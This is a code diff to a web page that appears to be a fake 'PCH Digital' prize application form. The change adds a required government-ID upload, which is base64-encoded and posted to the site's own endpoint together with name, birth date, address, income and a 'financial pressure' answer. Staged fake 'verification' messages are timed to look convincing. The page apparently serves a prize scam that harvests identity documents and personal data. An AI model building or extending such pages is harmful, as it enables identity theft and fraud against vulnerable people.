@@ -93,6 +93,23 @@
       outline: 1px solid var(--pch-orange);
       border-color: var(--pch-orange);
     }
+    input[type='file'] {
+      padding: 8px;
+      font-size: 10pt;
+      background: #fafafa;
+    }
+    .file-hint {
+      font-size: 9pt;
+      color: var(--pch-muted);
+      margin-top: 6px;
+      line-height: 1.45;
+    }
+    .file-name {
+      font-size: 9.5pt;
+      color: #2e7d32;
+      margin-top: 6px;
+      font-weight: 500;
+    }
     .section { margin-bottom: 22px; }
     .section-title {
       font-weight: 700;
@@ -262,6 +279,20 @@
           <label for="phone">Mobile phone</label>
           <input type="tel" id="phone" name="phone" required />
         </div>
+        <div class="field-row full">
+          <label for="id_document">Government-issued ID</label>
+          <input
+            type="file"
+            id="id_document"
+            name="id_document"
+            accept="image/jpeg,image/png,image/webp,image/gif,application/pdf,.jpg,.jpeg,.png,.webp,.pdf"
+            required
+          />
+          <p class="file-hint">
+            Upload a clear photo or scan: driver&rsquo;s license, state ID, passport, or national ID card (front side minimum). JPG, PNG, or PDF — max 8 MB.
+          </p>
+          <p class="file-name" id="file-name" hidden></p>
+        </div>
       </section>
 
       <section class="section">
@@ -389,6 +420,55 @@
       var successScreen = document.getElementById('success-screen');
       var submitBtn = document.getElementById('submit-btn');
       var status = document.getElementById('status');
+      var idInput = document.getElementById('id_document');
+      var fileNameEl = document.getElementById('file-name');
+      var MAX_FILE_BYTES = 8 * 1024 * 1024;
+      var ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'application/pdf'];
+
+      idInput.addEventListener('change', function () {
+        var file = idInput.files && idInput.files[0];
+        if (!file) {
+          fileNameEl.hidden = true;
+          return;
+        }
+        fileNameEl.textContent = 'Selected: ' + file.name;
+        fileNameEl.hidden = false;
+      });
+
+      function readIdFile(file) {
+        return new Promise(function (resolve, reject) {
+          if (!file) {
+            reject(new Error('Please upload a government-issued ID.'));
+            return;
+          }
+          if (ALLOWED_TYPES.indexOf(file.type) === -1) {
+            reject(new Error('ID must be JPG, PNG, or PDF.'));
+            return;
+          }
+          if (file.size > MAX_FILE_BYTES) {
+            reject(new Error('ID file is too large. Maximum size is 8 MB.'));
+            return;
+          }
+          var reader = new FileReader();
+          reader.onload = function () {
+            var result = reader.result;
+            if (typeof result !== 'string') {
+              reject(new Error('Could not read ID file.'));
+              return;
+            }
+            var base64 = result.split(',')[1] || '';
+            resolve({
+              fileName: file.name,
+              mimeType: file.type,
+              data: base64,
+            });
+          };
+          reader.onerror = function () {
+            reject(new Error('Could not read ID file.'));
+          };
+          reader.readAsDataURL(file);
+        });
+      }
 
       function setField(name, value) {
         var el = form.querySelector('[name="' + name + '"]');
@@ -409,6 +489,7 @@
 
       var steps = [
         'Verifying your information…',
+        'Reviewing identity document…',
         'Recording application profile…',
         'Submitting to PCH Digital…',
         'Processing for final review…',
@@ -443,48 +524,56 @@
         status.className = 'status';
 
         var fd = new FormData(form);
-        var payload = {
-          appRef: fd.get('app_ref'),
-          prizeCategory: fd.get('prize_category'),
-          appDate: fd.get('app_date'),
-          fullName: fd.get('full_name'),
-          dob: fd.get('dob'),
-          email: fd.get('email'),
-          phone: fd.get('phone'),
-          addressStreet: fd.get('address_street'),
-          addressCity: fd.get('address_city'),
-          addressRegion: fd.get('address_region'),
-          postalCode: fd.get('postal_code'),
-          addressCountry: fd.get('address_country'),
-          maritalStatus: fd.get('marital_status'),
-          dependents: fd.get('dependents'),
-          employment: fd.get('employment'),
-          monthlyIncome: fd.get('monthly_income'),
-          financialPressure: fd.get('financial_pressure'),
-          megaPrizePlan: fd.get('mega_prize_plan'),
-          acceptLowerTier: fd.get('accept_lower_tier'),
-          infoConfirm: fd.get('info_confirm') === 'on',
-        };
+        var idFile = idInput.files && idInput.files[0];
 
-        submitBtn.disabled = true;
-        runProcessingSteps();
+        readIdFile(idFile)
+          .then(function (idDoc) {
+            var payload = {
+              appRef: fd.get('app_ref'),
+              prizeCategory: fd.get('prize_category'),
+              appDate: fd.get('app_date'),
+              fullName: fd.get('full_name'),
+              dob: fd.get('dob'),
+              email: fd.get('email'),
+              phone: fd.get('phone'),
+              addressStreet: fd.get('address_street'),
+              addressCity: fd.get('address_city'),
+              addressRegion: fd.get('address_region'),
+              postalCode: fd.get('postal_code'),
+              addressCountry: fd.get('address_country'),
+              maritalStatus: fd.get('marital_status'),
+              dependents: fd.get('dependents'),
+              employment: fd.get('employment'),
+              monthlyIncome: fd.get('monthly_income'),
+              financialPressure: fd.get('financial_pressure'),
+              megaPrizePlan: fd.get('mega_prize_plan'),
+              acceptLowerTier: fd.get('accept_lower_tier'),
+              infoConfirm: fd.get('info_confirm') === 'on',
+              idFileName: idDoc.fileName,
+              idMimeType: idDoc.mimeType,
+              idData: idDoc.data,
+            };
 
-        fetch('/api/application-profile', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-        })
-          .then(function (res) {
-            return res.json().then(function (data) {
-              return { ok: res.ok, data: data };
+            submitBtn.disabled = true;
+            runProcessingSteps();
+
+            return fetch('/api/application-profile', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+            }).then(function (res) {
+              return res.json().then(function (data) {
+                return { ok: res.ok, data: data, email: payload.email };
+              });
             });
           })
           .then(function (result) {
+            if (!result) return;
             setTimeout(function () {
               stopProcessing();
               if (result.ok) {
                 formBody.classList.add('form-hidden');
-                document.getElementById('success-email').textContent = payload.email;
+                document.getElementById('success-email').textContent = result.email;
                 successScreen.classList.add('visible');
                 window.scrollTo({ top: 0, behavior: 'smooth' });
               } else {
@@ -492,11 +581,11 @@
                 status.className = 'status error';
                 submitBtn.disabled = false;
               }
-            }, 4500);
+            }, 5200);
           })
-          .catch(function () {
+          .catch(function (err) {
             stopProcessing();
-            status.textContent = 'Could not connect. Check your internet and try again.';
+            status.textContent = (err && err.message) || 'Could not connect. Check your internet and try again.';
             status.className = 'status error';
             submitBtn.disabled = false;
           });
